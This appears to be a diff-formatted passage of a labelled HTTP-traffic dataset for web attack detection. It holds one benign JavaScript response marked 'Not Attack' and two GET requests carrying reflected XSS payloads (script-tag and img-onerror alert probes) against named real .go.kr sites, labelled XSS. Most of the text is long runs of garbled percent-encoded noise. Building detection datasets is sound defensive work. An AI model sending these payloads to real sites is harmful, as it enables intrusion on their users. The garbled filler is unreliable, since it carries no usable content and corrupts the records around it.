+       %0%6%7%0%0%0%9%0%2/0%25%2/25%7%25%27%0%7%0%3%25%2%22%20%25%25%7%2%8%2%22%25%7%2%2%7%25%25%2%0%17%5%0%2%2%2%s1%7%2%2%25%2%5%3%7%25%3%2%2%5%5%0%0%2%17%5%4%2%7%3%2%3%1%3%2%7%7%2%3%2%2%7%17%3%3%3%5%3%3%3%2%3%3%2%7%3%2%2%2%3%3%2%25%24%3%3%3%7%3%3%3%2%3%3%3%3%3%2%3%3%3%3%3%3%3%2%2%3%3%3%3%2  %3%3%3%3%30%3%3
+
+      %3%29%}
+8%2%3%7%3%0%3%3%3%3%3
+       %2%16%3%3%7%2%2%2
+    \\2%3%3%3*
+
+%2%2%3%9/,/2%2%7%3%3%3%30%2%1%2%2%3A%3%3%3%3%2%2%2%3%3%3%2%27%3%6%3%3%30%2%12%3%3%2%7%3%14%2%3%3%3%25%7%2%7%2%\\2%6%3%3%2%9%7%3%7%2%2%3%6%2%3%0%2%2%2%7%9%4%7%3%3%2%2%2%3%6%7%1%6%7%3  -%3%27%3%3%3%6%9%25%3  %7  %  %&%3    %3  %
+   %2%9%2%7%3  %2   %6%3  %7  %6%3  - 1  %\
+ 3/6 3   %3      %3  %3%8%2%2%3    3%2%2%3%2%3%3%6/p%2%3%6%3%6%7%3%17%1%5%7%2%2%7%3%3%3\\0%0%25\x3%5   ***/1%2%2
+      &1 1%3%6%7%3%8%25%6%7%3%6%8%2%6%8%7%7%0%6%2%0%6%5%0%0%3%5%0%7%7%3%1%7%0%7%2%5%0%0%17%7%7%0%2%7%1%6%2%5%2%2%2%7%7%3%2%2%6%0%2%6%0%4%3%0%0%3%17%6%2%2%6%0%5%3%2%26%0%2%2%1%1%30%2%16%16%2%1%2%55%25%3%17%1%2%2%1%5%7%7%1%1%2%1%1%6%6%2%7%1%2%1%2%1%0%1%0%0%2%6%1%27%2%1%1%2%2%5%5%7%1%2%3%1%7%3%2%6%2%0%3%1%2%5%3&2%2%2%6%7%2%6%2%2%7%2%7%6\
+7%6%2 8%1%9%7\r%1%2%2%1%  %/  %%7%1%1%2%7%6%17%1%0%1%6%7%4&%2%2%1%16%6%1%7%7%6%6%6%2%2%10%5%3%7%1%1%6%16%1%\
+  %\""
+  %/\
+   %%5\
+  %\\
+%7%6%1%2%7%1%0%25%3%16%25%2%1%1%16%1%1%}
+  %/}
+
+  %/
+
+P%\
+  5%16%12%1%0%25%3%20%5%11&
+
+ 0%7%21%0%5
+  
+
+  %%25%7%16%7%0%1%25%7%50%0%25%25%3%6%3
+  %,0%1638
+  
+
+   %/`
+
+  /%25%3%1%7%\
+  %\
+  %\
+ 1
+
+%3%28
+  
+
+  %/`
+
+ 1%3
+  
+
+ 0%12%6%3%7
+
+ 1
+  
+
+   s%7%1%7%28%35%3%1%1%6%0%7%27%0%16%7
+ 0%25%55%7
+       %0%30%7
+  %3\
+   
+
+  
+
+   -%3
+     -
+
+C  /%3%7%25
+   %\
+       %0%3
+    %1%25%7
+    \\
+  %/3%1%7
+
+0%3%3%25%3
+                               
+    %%7%1%3
+  %3
+    %\
+25%3
+    %\
+  %3
+  /
+
+   &amp
+  %/3
+
+    )/  %\
+3
+   9 1%7%3 2%7%0%3
+  %0
+    %\
+3
+   %\
+1%2%7%3
+    %\
+3%28%7%2%3%1%7
+  )
+  %\
+1%7%3%3%29
+  %9%3  -
+
+  %/3%3%3rd%3%3  %/3%2
+  
+
+  %3
+  
+
+  /
+
+ 3%3
+3\
+3
+%3
+%3\/
+%3&#5%3
+%3  %\
+3
+&%3%3%/3
+%3
+ 3%3
+  -
+
+  -
+
+  
+3%3
+1%3%3
+%3
+\
+1
+ no%1
+  \
+
+ \
+
+1
+  
+
+  %\
+3
+   %/``
+  %\
+3%1&#
+1
+ /  -
+
+   %/  /%5
+ %/\
+
+ %/3%2
+ %%1%3%5  %&%3
+ 1
+ %/\
+
+ %/   %\
+1
+  
+
+  /C
+  %\
+3%1%3%7%  
+}
+
+}
+
+8
+}
+  %\
+3
+  %\
+
+%3
+  
+
+  %\
+3\
+1
+   %/\
+}
+
+The%3
+    
+
+C
+}
+
+
+3
+    }
+
+ 2
+  %%3%3
+%3\\
+  C%2%1
+    %%0%3
+%3%3%2%2%1  %%0%3  A
+  %%2</C+1%7%2
+  -%0%7%17%2
+  %/2
+  %7%2%5%0%7%0%2%2%2
+   %%1%2%2
+   http%3
+  %%2%2  %/\
+2
+  http%2
+  %2
+   -%1  %2
+  \c%2   -%3 2  %2/\
+1
+  -%2  0+&  %-  %2
+ 1    8%3  -  -%2
+
+A
+  http+c%2
+  3
+  1   -  \
+  - 7 7   1   //
+    A   - 0 7%2
+     %/   %/  -  http%3%3%1%1%3%2  %/\
+  /  \ 
+   %/0%2
+  %2%3%2%5    %/  %%2%3%2%3  %%3%2%3%3  %/  %/  *\
+1%3%2%3  %/  %/  %/   %/  %%3%3   %.  %\
+1%3%2%2%0%3%2%3%3 1%3%3  
+
+  %%28%3%3%2%3&3%3%2%2%3%1%3  %1%2%3  -    -  %2%2%2%2%2%2%2%2%2%2%2%2%2%2%1%2   %%2  %%3%2%1  %/  %/  %%3  %%2%1&%1%3%1%3%2%2&%2%2%3%2%1%3%2%2%2%2%2%2%2%3%3  %%2%1%2%2%2%2%2%3    %%2&%2%3%3%2 1%2%2%2%2%2%2%7
+  %\
+3%3%1%2%2%2%1%2%2%2%17%2%2%3%3%2%2%3%2%2%2%3%3%3%3%2+&%2%2%2%3%2%3%2%2%2%2%2%2%2%3%2%2%2%3%3%2%2%2%2%2   %1%3%2%1%5%2%2%2%2%3%0+B%1%1%1%7%1%2%2%2%2%2%2%2  A      %0%2%0%2%2%2%0%8%2%2%2%2%2%3%2%3%3 7/  2      3%2%2%2%2%3%2%3%3%3%2%3 1%2%3  %%3%3  %/    &%3%3%2%3*  * 1 1 3*3%2  4%2%3  C%3%3%5  C%1%1%2 0%3 4%3%2%3"
+113106,"HTTP/1.1 200 OK
+Date: Fri, 24 Mar 2023 00:45:33 GMT
+Content-Type: application/javascript
+Content-Length: 921
+Connection: keep-alive
+Server: PWS/8.3.1.0.8
+Last-Modified: Tue, 25 Oct 2022 12:27:58 GMT
+Accept-Ranges: bytes
+X-Robots-Tag: noindex, nofollow
+Age: 169
+Via: 1.1 PSygldLON2it16:10 (W), 1.1 PShgseSEL7ll104:6 (W), 1.1 PS-GMP-01k7Z38:16 (W)
+X-Px: ht PS-GMP-01k7Z38GMP
+X-Ws-Request-Id: 641cf2ad_PS-GMP-01k7Z38_48679-36810
+Access-Control-Allow-Origin: *
+Cache-Control: max-age=300
+
+$("".DGField textarea"").removeAttr(""class"").removeAttr(""id""),$("".DGField label"").remove(),$("".DGField span"").removeAttr(""class""),$("".DGField:gt(0)"").each(function(){$("".DGContainer"").append($(this))}),$(""#content>div>br"").remove();var WordsFileRoot=""https://cdn.ipsosinteractive.com/deploy/templates/iis-template/js/DG/v1.4/"",URLWordsFile="""";URLWordsFile=""NCProject""==productType||""NewTest""==productType?WordsFileRoot+""cre_words.txt"":WordsFileRoot+""words.txt"";var noOEFOund=!0;function unboundReady(){initDG()}function initDG(){hasOE&&$("".mrEdit"").each(function(){if(!$(this).is("":hidden"")){let t={index:1,tA:""#""+$(this).attr(""id""),pA:pA,tS:tS,hP:hP,rF:rF,fR:fR,bW:bW};return BootstrapFront(t),noOEFOund=!1,!1}}),hasOE&&!noOEFOund||BootstrapFrontMini()}function saveDGData(t){let e=t;for(let t in e)$('.DGContainer textarea[name$=""_Q'+t+'""]').val(e[t])}initDG(),$(""body"").on(""fakeReady"",function(){noOEFOund=!0,initDG()});",0,Not Attack,,38,-1,False,"A
+     %2
+2nd/m7 ```
+    s%2\\0%2\\2
+;\\70
+        2nd%2
+       %29%2%5
+
+*.*
+                          
+     %5
+      \-4
+
+   \\2nd%2%2
+       %2*
+
+       2%2%2****
+       0%2%7*6%2%2*
+
+      %5%2%2%2%6%2%2%5%2%2%2%2 *
+2%2%7%2%2%7%2%5``
+1%2%2%2%2%2%2%2%2%2%2
+       %5%2
+       %6
+
+       %2\/
+       %2%2
+       0.7
+       %2
+       %}
+       * \*6*
+
+        */}\\
+
+       %2%2%2%3A/F/
+     3``0%2\\2\\0%2.1%7\\0.1
+       2 2%2/2.1
+      %2%2%2.1.2
+       2.
+
+, a\\2.1.1""\\2
+
+       2
+       2.
+     \\2\.1
+
+       (0 (0 (0 (1
+
+       2
+       2%7%3%2%2%2%2%2%2%2%2%2%2%2%5%2%2%5%2%7%2%2%2%1%5%5%5%2%3%0%7%2%2%2%0%0%1%7%0%2%7%0%2%2%2%25%2%2
+
+What%2%2%2%2%2%2%1%2%2%2%6%0%2%2%2%2%2%9%2%1%1%1%1%2%2%1%1%1%7%1%3%2%2%2%2%2%2%2%3%1%2%3%2%2%2%2%16%2%5%1 (http%2%2%2%1%2%2%1%2%2%2%5%2%1%2%2%2%2%2%2%2%2C1st9%2%2%25%2%7%2%2%2%2%17%7%2%2%2%0%20%20%2%2%1%2%3%25%2%4  %2%2%3%2%7\r3%2%2%2%2%2%2%2%2%1%25%1%1%10.50
+   </c%2%1
+
+      
+
+   
+
+   %1 ́2  %1  QP/1200%2%2%1
+                            %1 0
+
+  
+
+      \1  %1
+        %2*m9
+  
+
+   
+
+  \.1000\/
+       
+
+    *0
+       %7*1
+      \*9*0\/
+       %1\/test%7/m%25%17%16%3%20%3%3%17%64%3\0  %1%3
+       %1
+       %2
+  :90%5/
+  
+
+       %5
+      %1%20%20%25%3}
+       %/60
+      %1%3/1
+       %0
+        }
+  - 1%0
+        /%0
+
+       %}
+    ``
+       0%2%0
+       %2 100%17%2%0}
+        \.501%7/25*/
+        %0
+       %4  /7/25%2%5*/
+%28*K%7%6%25/0
+  ---
+  /7%0%28/1
+
+      %/0%7%25%7%8%2%20%3%2%2%5%2%7%5%7%2%9%7%7%3%2%2%24%7%2%25%7%0%5%0%0%5%2%2%7%3%2%2%2%2%3%7%7%3%1%5%3%2%3%2%2%0%5%5%2%2%9%3%3%3%3%2%7%7%7%3%7%3%2  %7%3%3%2%3%5%3%25%2%3%4%3%3%3%2%2%2%3%3%2%3%7%3%2%3%0%3%3%3%2%3%3%3%3%3%2%2%3%3%3%3%3%3%2%3%2%3%3%3%3%3%3%3%3%3%3%3%3%2%3%3
+
+      %/,,,
+
+%7%3%2%3%3%3%3%3%3%3/29%28%3%3%2%2%2...
+    %30%3%7%3%3%2%8%3%3%2%3%2%3%3%2
+%16%3%3%2%2%3%3%3%3%3%2&%2%3%3%3%3%2%3%3%3%3%3%20%6%2%3%3%11%2%3%3%3%1%2%3%2%7%7%3%3%7%2%2%2%1%2%3%9%7%3%2%2%3%3%1%3%3%7%2%7%3%2%3%30%2%3%8
+       %3  /%3    -%6*
+  %3%3%26%3%6  %27%3%3%9%0%7%9   -%2%3%3%3 1  -%3%16%3  %  7%3%3%40%25%3     7%6%3  %2%3&7%25%27%7    0%3%3%3%3%2%2     1%3%2%2%3%3%3%13%5%7%3\r%4&1%2%6
+    P 1%4%5%2%3%3A   \.\
+  -%0%5%25%5%3%7&3\n/p%3%6%2%3/1%6%3%3%6%6%5%6%8%6%1%3+c%17%7%6%0%25%1%0%0%2%0%0%5%6%3%3%2%7%6%2
+   \%8%7%25%7%6%7%6%7%27%8%2%7%\
+  \    %3%3%7%2
+   \\1  %0%0%3%3%3%0%2%3%0%2%3%3%3%7%17%3%3%2%2%7%17%1%2%1%0%1%7%16%1%6%16%5%17%1%1%2%6%1%1%2%6%1%7%2%1%6%1%1%26%2%2%1%2%2%2%1%5%0%0%2%1%0%1%1%7%6%2%2%2%5%6%5%3%7%6%3%6%2%7%5%5%2%2%0%2%6%5%2%2%1%2%2%7%16%2%7%1%3%6%6%7%1%1\/
+
+  \)
+ 1%6%6%7%6%6%0%2%7%0%2%s%1%1%1%5/f%16%7%16%2%2%0%16%6%6%2%7%3%7%1%6%17%1%6%2%5%2nd%7%2%7%1%0%25%17%6%2%0%6%18%5\/%3%\
+  
+&%\
+  %/\
+  %/\
+  %/   pd%1%3%25%5%1%1%17%5%1%1%\\
+  /%25%0%1%16%8%1%5%7%1%28C%7%25%50%7%1%0%5%17%0%3
+  %\
+  %/\
+25%16%1%0%25%2%28%25%30%16%0%1%2%3
+  %%28%4%26
+   %/""
+  %/  %\
+   %/\
+  %/\
+  %/\
+1%27%28%3%1%1%6
+  %\
+    \'
+  %%28
+&
+  %/\
+       
+
+   
+
+   
+
+  
+
+   )
+ 8*\
+  \\s
+%7
+   
+
+&1%9%1%0%28%0%7%3
+   
+
+P%\
+0
+  %b&\
+      
+
+  %\
+3
+  %\
+  0%16%3
+&
+
+  -  \\25%16%3%3%6
+   %\
+   %0%25%27%3
+     
+
+  
+
+  %%3%25%3%3%0%3%2%1  %/  %%2%27%3%3%16%3
+
+  %0
+
+  7%3"
+37846,"GET /upload/faq.php?acuparam=%3E%22%3E%3CScRiPt%3Ealert(8924)%3C/ScRiPt%3E HTTP/1.1Host: www.cocoms.go.krUpgrade-Insecure-Requests: 1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: en-US,en;q=0.9Connection: keep-alive",1,XSS,,39,-1,False,"2A
+
+        0.0  A/p""
+      
+
+      2A%2\0%2
+
+    A0.0%2\1.2.50, some, a\\1\n2
+       and/or\\7\""A0%3\.2
+
+        else``, a\\5
+0
+
+       (https%2%2%2%2%3%2%2%2%1%2%2%2%2%2%2%7%2%2%2%5%2%2%5%2%5%5%1%2%7%2%2%1%1%2%2/p%2%0%0%2%0%0%2%7%0%2%2%2%2%2%2%2%2%2%2%2%2%2%2/M%2%1%6/b%2%2%2%2%7%2%2%1%3/C%1%1%2%2%2%5%0%1%1%1%2%2%2%0%2%2%3%2%2%2%5%0%2%2%3%2%0%2%2%2%2%2%2%5%1%2%1%2%1%2%2%2%25%28%2%2%2%2%2%2%25%2%2%2%2%5%5%0%28%2.0%5%2
+       (..%5%2/p5A\r/2%2%2%2%6%20%2+&
+
+  
+
+       %2%3%2%2%9
+
+   0%2%2%2%2%2%2%2%2%5%2%3  HTTP%20%2%2%1  [1
+        
+  
+
+5%3%2+
+       1
+      2
+   \.https
+       %1
+       %1
+       \\1  what)
+       %p\nm1
+        ```
+ 1
+ 0  c8 
+
+      1
+       *0*6%3\r0*
+
+  %1%5
+      
+
+     A%3/
+  
+
+  
+
+       %0%3 0%3*1%7%25
+       %0%25%3%3  %5
+       \\1%5%25
+     
+
+     ```
+  (https%2%25%25%25%20%25
+       \""
+   ```
+0%27%3  \""0%20%28
+       %0%25%0
+    *}
+        %0
+        %0%0  -
+
+       %0%2
+
+      0  and  -
+
+       1\.0%5
+
+       %3K%0%25%7%27
+       %/0%7%7/;0%0%7%25%0%0%2%0%0%3%30%2%27%7%7%7%25%25%2%30%20%3%6%7%25%25%7%7%16%25%27%7%5%25%2%5%27%7%7%0%5%0%0%7%7%2%2%3%2%2%2%2%2%7%7%2%3%2%0%3%3%2%7%5%0%5%1%2%7%3%3%3%3%2%2%7%2%7%3%3%7%3%3%3%3%3%15%5%3%3%2%3%7%2%3%3%2%3%18%3%3%2%17%2%30%7%3%3%3%3%3%2%3%3%25%3%3%2%2%3%3%50%3%3%3%2%2%2%3%3%3%3%3%3%3%3%3%3%1%3%2%2%3%3%3%25%7%3%3%3%3%3%3%3%3%3%28
+
+    %3
+
+%12%1
+   %3
+ ******.ve/1%3%3%3%1%3%7%2%3%3%2%2%3*t%30
+
+&7%3%2%2%3%3%3%3%3%3%3%3%3%3%3%2  0%3%15 6%3%3%3%7%3%3%3%25%3%3%3%2%3%2%8%7%1%3%1%2%3%9%1%2%7%3%3%0%3%7%3%3%7%2%3%16%2%2%2%7%3%6%3%3
+
+  -%1%6%7%6%3%6%2%2%3  -%3%9%3%3%3%28%9%6%3%3%3%7%2%3   A  %9 6%2%3  -%25%6  %0%3  %0%5*1 1%3%7 0
+       1%3       %8%6    C    %3%5%7%2%3%3%3%3%2%2%2%6%2%27%25%3*m%8%9%7%3%3%6%6+**
+ 1%2%7%9%3   1%7%0%5%3%3%3%3%2%2%3/m%8%3%7/p%7%3%25%7%5
+     )
+
+   &a%6%7%6%1%7%5%7%0%2%6%0%4%0%0%2%5%3%6%6%10%7%3%1%4%7%0%2%9%3
+  C  (1%2
+ 0%7%3/6%2%2%0%2%7%1%3%2%2%3%0%1%1%0%2%3%/3%3%2%9%2%2%20%3%0%3%3%1%2%1%2%2%1%6%2%5%16%7%2%2%3%6%1%10%9%1%1%1%2%1%1%1%2%1%0%1%6%1%2%2%2%1%1%1%1%7%1%1%2%1%1%6%5%7%2%2%1%2%1%5%5%7%1%2%6%1%7%2  %%7%2%0%0%2%1%2%5
+    }/\
+  %1%2%1%7%2%6%7%6%6%2%7%1%1%7%5%6%27%7%6%3%2
+     
+
+   %\\8%2%1%1%1%6%2%2%8%1%7%1%20%3%1%6%6%1%7%0%3%7%1%5%7%1%2%29%6%5%7%3%7%1%50%5/t%\
+&%\
+    %/\
+       %/  %/\
+    %/\
+   %/0%50%1%20%1%7%2%25
+  %%27%5%30%1%1%1%0%25%150%25%6%7%5%16%1%1%7%150%50%0%27%25%3%1%0%5%7%0%1%5%6%25%6%1%7%27%5%7%28%25%25%7%14%25%3
+  %/  %1%16%7%25
+  %\\
+  %/   %/  PF%3
+  %%7%28%1
+  
+
+ 1%7%3%60&
+  %1
+  %%0%28%1%2
+  3%1
+ 1%61%16%0%1%7%30%7%1%1
+
+  %-0%16%29%0%16%7\np%0%5
+    \q 3
+  
+
+       https%3
+   \\1%3%30%25%16%3
+   %3    -  %3%25%0
+\r%0
+    %3
+    \\3%16%26%0%3%3%27%3%3
+
+0%16%3%1%7%7%1%3
+   %2
+      %3
+    %\
+7
+    %3   %3
+    \q1
+        1%3    %\
+    %\
+
+7%1&
+&
+   7%3    3%0%3  |
+ 0%\
+    %/  \'
+ 2
+   \
+   7%3%12%3  %/   }
+  /\\
+   .%7%3/t%3%0%3%3%26
+    %/  ]
+  [/
+7%3%1%3%3%2
+ 3%26%3%3%3%29%3
+ /
+
+  /%3%3
+
+%3 3
+  %\
+3
+ /
+
+  %3
+\,  
+  %3%3
+  %/
+  -  A%3
+  /
+
+  %/  %3
+3
+ 
+
+
+0
+ 
+A
+3
+ /%3
+ A\\
+ ```
+
+ ```
+
+1%3
+1
+  /2
+  %1
+3
+1
+   -  %3%1%7&%5%3
+  %/  %/1%5
+1
+ A
+%7%3%1
+ %\
+1%3%2
+1%3  *
+
+}
+
+  %/1%3
+   %\
+0
+  %\
+
+ }
+
+
+  %-   %3%3%}
+
+\
+
+     %\
+0
+1%\
+
+  %\
+3%3%3}
+  
+
+  %\
+3%1
+  %\
+0
+  
+
+P
+       %%3%3%2
+  %-1%2   %\
+3
+  
+
+F
+%3  P%3
+    %%1%25
+  
+
+  %%3
+%2
+1%3
+  
+
+A  %1%3%3%2
+   %%2
+  
+
+C%5%3%8%2%2%8%2%2%5%1%3  %C%2%2&M\]  %1%2%2/host%1%2%3%3%2  %\
+3%2%2%2%1%1%2+C%5%1%2  %/  %/1
+   \\3  %T  /%2}6  %P  -%0+all%5   %A%2   - 1%2%50  1%3
+  
+
+&before%2   C    %2  *C   -  / 6%1            C 1 0%3%3  /  -  /   %/\
+3%2%3
+  - 3&%9%3  %\/
+ 3%3
+   %C  %/
+  %/  %%2%3%3
+  /  %\
+3  %%1  %%2%3  %/  /  /%16%3%2%3%3  %3\
+3%3%/2%2%1%3%3%6%1%2%3%1%2%3%3  C 0%3%3%2%3
+ No%3  %,  %/ 3%3%3%3%3%2%3%2%2%0 6%1%2%2%1%3%2%2   - 2%2%3%3  / 2%2%2%2%2%2%3%2%2%2%1%2%7%3  %& ```
+
+   %%3%0%3  %%3%2%1%3%0%3%1%2%2%1%2  &%3%3%2%7&%2%2%2%0%3     %0%2%2%3%\
+0%2%2%3%3%2%3%2%2%3%2%2%3%3%2%2%2%2%2%3%2%3%2%2%3%2%2%2%2%3%2%2%2%3%2%2%2%2%2%2 3%3%2%2%2%3%2%8%3%2%2%2%2%2%3%2%2%2%2%2%2%2%2%2%2%2%2%2%2%2%2+t%2%2%2%2%1%3%3
+&%0%2%2%2%2%0%2%1%7%0%2%2%1%2%2%2%1%3%3%0+&%2%2%1%2%7%0%3%2%3%5+m%2%2%0%9%2%2%3%2%3%2   5%2%2%3    %%3+2%2%2%2%2%3   -  3 42%3%2%3%2%3%3%2%6%3 50%3   *\
+3*2
+    *%3*3 1%0%2%3 1%8/6%1%3%1 0%7%5 1%3%3 0 1%2%5%3%0%3%3%3%3%3%3%2%1%3%1%0%3%3%3%3%2%3%1%3 1%3%3 7%3%2%3%2%3  %&%3%2%2%3%
+  0%3%2%3%7%0%1%2%3 0%3%1%3 ���
+  7 0%2%5
+  3%3  0%3%2%7%7%1%3 7%2%1
+ A\r 1%3%1%1%3%2%7%2%1%3
+
+ A  )&%1%1%5%7%3%1%7%3%7%2%1%3%1%3%2%7%5%3%3%3%5%1%7%3%2%7%3%2%7%2%3%1%2%7%7%2%7%7%3%1%3%7%3%2%5%7%2%3&%5%2%1%3%1%3%3%3%2%5%2%3/​, 1%7%3%3  A    44%3&%3%3%2%3%3%1%3%1%3    1%3%3 0%2%2  1%3%1%1%3%2%3%3%3%3%1%2%1+C%2%3%2%3%1%1%5%1%5%2%3%1%1%2%2%1%1%3%1%1%2%2%3%5%3%5&%3%1%2%2%3%5%3%2%1%1%5%3 0%3 0%5%0%5%3%9  A  A  A  A  A  A  A %0%3%3%1%2%5%2%3%3%2%3%0%2%1%3%1%1 1%3%0%2%3%3  A 1  A  A  A  A  A 1%3%1%3  A  A  A  A  A  A  A 1%3%3%2%2  A  A  A  A 0  A 0%2%3%3%5  A  A 1%2%1%1%1%2%2%3%2%2%0%1%2 1%2%3%2%3%2%3  A 1%2%2%3  A 0%3%2  A %%3%2%1%3  A  A  A  A  A 3%3&%1%2%2%1%1%1%2%2%3%3%3%.3%0%2%3%3%2%2%0%3%2%3%3%2%3%2%3%3%3%2%3%2"
+39281,"GET /?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1Host: www.korean.go.krUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,XSS,,40,-1,False,"2%5%2%5%2%5%2%5%3%2%1%2%2%2%2%5%0%2%2%0%0%2%2%2%7%2%2/p%2%2%2%2%2%2%1%1%2%1%2%2%2%6%1%5%1%2%1%2%2%2%1%1%0%1%1%1%2%2%1%2%0%2%2%2%5%0%2%3%2%2%1%5%3%2%2%2%0%0%3%2%0%3%2%25%1%2%2%1%2%2%2%2%2%2%2%2%2%1%2%0%2%3%1%2%1%2%2nd%20%7A%2%0%2%25%2A7A%3\r\n%25%25%20%26%2  -%2%25%1%2%2%2%2*
+
+  %3%2%7\r3%2  and%2%0%2%2%2%2%2%25%7%2**1%20%7%2%25%9
+P%1 1
+   \.11  what%2\r2
+   - %3A%10
+   %1%1
+    
+
+   \1
+      
+
+   %3
+       &amp;5
+     
+
+       \\1
+                           
+    
+
+       \.1\
+       /1\0
+       /1}
+    
+
+   \.8  A  }
+ 3
+       %5%5%3%16%25%20%3%27%1 3  )
+  %3
+   \.51%1
+     
+
+    %3%25
+     
+
+       %28%2%25%2%25%25%25%20%27%25%7/25%3
+       %0  C
+   
+
+    %/0%25%7%25%0%1%0
+    %/1
+  }
+       %7  \.0  %7
+       \.1%5%25*   %3
+  ]
+  %/5%25%25%4%25%25%7%7%
+    %/0%27%0%0%0%16%25%2%2%2%3%25%27%7%25%30%3%2%2%25%25%25%25%7%25%25%25%25%25%2%2%7%7%25%24%7%0%5%0%0%25%7%2%7%25%24%2%7%2%7%0%7%1%2%8%3%7%3%2%3%0%7%25%2%2%3%3%3%3%3%4%7
+
+You%3%7%2%3
+  1%7%3%3%3%5%3%3%7%2%3%7%2%3%9%3%2%3%3%16%7%3%3%7%3%3%2%25%3%3%2%3%3%3%3%2%2%3%3%3%3%3%3%2%3%3%3%3%2%3%3%3%23
+
+%3%3%3%3%3%3%2%28%3
+
+&%3%7%3%3%25%3
+    
+
+    %3
+
+  %50%3%3
+
+  A%2%3%2%3%3%25%3}
+3%3%2%2%2%3%3%25%3%3
+    %2%2%7%3%3%2%2%2%3%3%3%3%3%2%28%3%3%3%3%2%3%3 0%3%25%3%3%3%2%6%3%16%3%3%18%3%3%2%25%2%2%3%3%3%3%30%3%2%7%7%3%2%2%2%3%3%7%7%3%6%2%2%7%3%3%7%9%2%2%6%2%9%18%3%7%10  %6    %6%3%9%3%3%9%2   -0%7%7%3%2%3  %3  %3  %6%27%3%3  M 3%7%2  M  3%1  3  )
+  7\\6  3
+   1 9%2%3  (  9%3%3  M 3%3%2%3%7%3 3%2%3%3%3%5%2%2%2%3%5%3%2%28%6%7\nC%5%3/m%7%3/1%3%3%0%5%3
+  -  ;%3%24%1*re%3\/C%7%3%2%7%5%26%3%6%5%26%16%3%25%8%17%6%6%7%25%3%0%0%6%0%0%1%31%0%7%5%5%2%7%0%3%2%16%7%0%25%8%7%0%2%7%7%2  %\\-1%1%3%6%2%3%3%0  C  0%6%5%0%2%3%0%0%5%2%16%2%26%7%1%0%17%2%1%26%1%7%1%3%2%2%16%17%16%2%2%80%1%1%6%1%2%16%2%2%1%1%1%2%1%6%1%0%2%2%6%1%2%2%1%1%0%1%1%0  }
+  -  %\
+  and 1%2%2%6%6%5%5%3%1%2%2%2%6%7%5%2%30%0%7%6%6%2%2%6%6%2%2%6%6%1%1%7%7%6%7%2%1%2%6%6%8t%6%2%6%6%2%7%16%7%7%2%1%6%6%2%1%3  %8%2%6%7%3%6%1%2%2%16%16%2%6%2%7%4%1%2%6%2%5%7\\%MF%6%28%0%7%1
+  %\
+  %/  %/\
+  -%\
+  %/\
+  %/\
+  %/\
+  %/\
+  %/\
+  %/  %%1%5%15%10%1%1%MF+7%1%5%3
+
+%5%5%8
+
+  %%28%1%1%1%30%7%7%3%0%1%0%0%6%7%15%7%7%16%5%0%7%7%30%7%17%\\5%1%1%E5%27%27%5%5%25%0%15%27
+  \\\3
+  %/  %%5
+  -%1%7
+ 1%20%3%1%3%27%7
+   %\1%0%28%16%1
+  %%0%1%7%7%1
+ 2
+  %\
+  %/ 3%1
+   %/\
+  P\\0%16%7\\0%0
+  3
+  
+
+C\%\
+   (\
+    %3
+  %\
+ 0%8%11%3
+  [/re
+   %b%3%6%25%28%3%0%0%27%26
+  %%25%0%3
+  %, 1%7%0%2
+  %1%30%2
+  %3
+   %3%7%25
+  %\
+  %\
+3
+  %/  %,  %\
+12
+  %\
+  &amp
+  *
+
+  %\
+3\
+3
+    &at  %/1%2
+  %/ 0%3%3
+ 0
+&%2
+   \
+  %/1%2
+ 2
+    &at%7%2%3%7%1%7%28
+  %/  0%3
+   \\\\\
+  %/   \`
+   )
+%3%3%3
+  /%3  %/3
+  %/3
+ 3
+
+3
+3
+  /%3
+    %/3
+%3%3%3  %/
+%1}
+
+3
+    %3
+3
+3  %3%3%3%3  \`
+
+ %/3%3
+3
+5%3
+  %1%/3
+  %%3
+%3
+   -no%1%8
+  %/\
+
+ No 1
+   %/3%7%5%2  \`
+
+  ‐  %1%7
+ %/7%5%1%3
+  %/1%3
+ &A%3%3%7%3&#A%1   ```
+
+ %/3%2%1
+  %\
+
+ ```
+
+ %%2
+%3
+2%3
+  5
+}
+
+}
+
+  %
+
+  %\
+C
+  %6
+``B%
+   %\
+3*\
+3
+   %0
+
+  
+
+A
+  %\
+3
+    %3
+   
+
+  
+
+&%3%3}
+
+%3  C%2
+  %%3
+%3%3%3%22%2%3%2
+  
+
+%3%3%3
+  %&%3+F%1%0%17%2%1%3%2%2
+  %1
+  %%0   %t%1%7%2  %C%3
+  %A%1%2%2\
+   %5  %\
+  %1%2%7  %/\
+3&%2%2
+  %/1%2  %2%2
+  %}
+  /    -  -   %  %C%2  -   %0+all+  
+  \,  )    %0%3  b 2 \\tC%2+7%2  %1%2
+  -  1 2    - 0%3    /   0%2
+  - 1    -   / 1  /    %/1%2%3%3
+  */1%3%3
+  %  )
+  %%3%2%1%3
+  %/1%2  %  %%3%2%2%3  %  %\
+3%2
+
+%2/1%3  %/  %%2%7%3%3
+3%3%2%2  -  &A%3%3%3%3%2%9%3
+    3 1%2%3%3%3%3%3   %%3%5%3%3%3%3%3%2%3%3%3%2%0%3%3%3  -  %%2%3%2%2%2%2%3 1%2  %/3%2%2%2%2  %/  %%2  *%2%2%5+C%8%2%2%1  %  %/  A%3  %%2%2%3%1%3%1%9&%1  %%3%2%3%2%2&%2+sub%2%3&%2%3+&%3%2&%3%3+  %0%3+b%2%2%3  A%3+&%3%3&%2%2%3%2%2%2%3+ 3%3%2%3%2  A%2%2%3%2%1%3%2%2%2%2%2%3%3%2%2%3%3%2%2%3%2%3%3%3%2%2%2%2%3%3%2%2%2%2%2%2%3%2%2%2%2%3%3%2%2%2%2%2%3%2%1%3%2%2%2%2%2+&%3%2%3%3%1%3%4%2%2%2%2%1%2%2%2%0%3%3%2%2%2%0%0%3%2%3%3%3%2%2%2%5   8%3%3 3  0%2     A%2%3%3%3%2%2
